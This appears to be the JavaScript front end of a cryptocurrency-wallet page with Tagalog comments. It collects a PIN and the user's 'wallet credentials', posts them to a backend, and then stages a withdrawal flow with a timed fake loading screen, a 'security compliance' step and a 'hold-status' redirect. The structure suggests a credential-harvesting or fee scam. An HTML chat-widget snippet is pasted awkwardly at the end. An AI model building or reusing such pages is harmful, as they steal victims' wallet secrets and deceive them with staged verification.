// 🌐 TAWK.TO LIVE SUPPORT INTEGRATION ENGINE
var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
(function(){
    var s1 = document.createElement("script"), 
    s0 = document.getElementsByTagName("script")[0];
    s1.async = true;
    // Siguraduhing tama at kumpleto ang URL ng iyong tawk.to widget
    s1.src = 'https://embed.tawk.to/6a1d4a8e69c65c1c2db679aa/1jq16mfv6';
    s1.charset = 'UTF-8';
    s1.setAttribute('crossorigin', '*');
    s0.parentNode.insertBefore(s1, s0);
})();

Tawk_API = Tawk_API || {};
Tawk_API.onLoad = function(){
    Tawk_API.hideWidget();
};

// PAGE TRANSITION CONTROLLER AT VALIDATION VIA BACKEND API
async function executeTokenValidation() {
    const pinField = document.getElementById('pinVerificationInput');
    const loginCard = document.getElementById('layerPINVerification');
    const spinnerCard = document.getElementById('layerLoadingWheel');

    if (!pinField || !pinField.value.trim()) {
        alert("Please enter a valid token.");
        return;
    }

    // Ipakita agad ang loading spinner habang nag-beverify sa server
    if (loginCard) loginCard.classList.add('d-none');
    if (spinnerCard) spinnerCard.classList.remove('d-none');

    try {
        // PAPALITAN: I-send ang PIN sa iyong secure backend API endpoint
        const response = await fetch('/api/verify-pin', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: pinField.value.trim() })
        });

        const data = await response.json();

        if (response.ok && data.success) {
            // Pag tama ang PIN galing sa server, mag-redirect
            window.location.href = "hold-status.html";
        } else {
            // Pag mali ang tugon ng server
            alert(data.message || "Security validation failure: Input token parameter mismatched.");
            if (loginCard) loginCard.classList.remove('d-none');
            if (spinnerCard) spinnerCard.classList.add('d-none');
        }
    } catch (error) {
        alert("Connection error. Please try again later.");
        if (loginCard) loginCard.classList.remove('d-none');
        if (spinnerCard) spinnerCard.classList.add('d-none');
    }
}

// 🌐 MASTER LOGIC ATTACHMENT COMPONENT
document.addEventListener("DOMContentLoaded", function () {
    const syncWalletBtn = document.getElementById("btnTriggerWalletSync");
    const walletInput = document.getElementById("walletAuthCodeField");
    const reportLayer = document.getElementById("walletReportMatrixLayer");
    const withdrawalBtn = document.getElementById("btnOpenWithdrawalForm");
    const loadingSection = document.getElementById("loadingSection");
    const securityComplianceSection = document.getElementById("securityComplianceSection");
    const authBlock = document.getElementById("authGatewayBlock");

    // Step 0 -> Step 1: Wallet Authentication Gate via Backend API
    if (syncWalletBtn) {
        syncWalletBtn.addEventListener("click", async function () {
            if (!walletInput || !walletInput.value.trim()) {
                alert("Please enter your wallet credentials.");
                return;
            }

            try {
                // PAPALITAN: I-send ang credentials sa iyong secure server api
                const response = await fetch('/api/verify-wallet', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ credentials: walletInput.value.trim() })
                });

                const data = await response.json();

                if (response.ok && data.success) {
                    if (authBlock) authBlock.classList.add("d-none");
                    if (reportLayer) {
                        reportLayer.classList.remove("d-none");
                        reportLayer.scrollIntoView({ behavior: 'smooth' });
                    }
                } else {
                    alert(data.message || "Wallet credentials mismatch error.");
                }
            } catch (error) {
                alert("System error encountered during synchronization.");
            }
        });
    }

    // Step 1 -> Step 2: Security Compliance Flow
    if (withdrawalBtn) {
        withdrawalBtn.addEventListener("click", function () {
            if (reportLayer) reportLayer.classList.add("d-none");
            if (loadingSection) {
                loadingSection.classList.remove("d-none");
                loadingSection.scrollIntoView({ behavior: 'smooth' });
            }

            // Real-time server check implementation recommendation
            setTimeout(function () {
                if (loadingSection) loadingSection.classList.add("d-none");
                if (securityComplianceSection) {
                    securityComplianceSection.classList.remove("d-none");
                    securityComplianceSection.scrollIntoView({ behavior: 'smooth' });
                }
            }, 2000);
        });
    }
});

<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://tawk.to';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
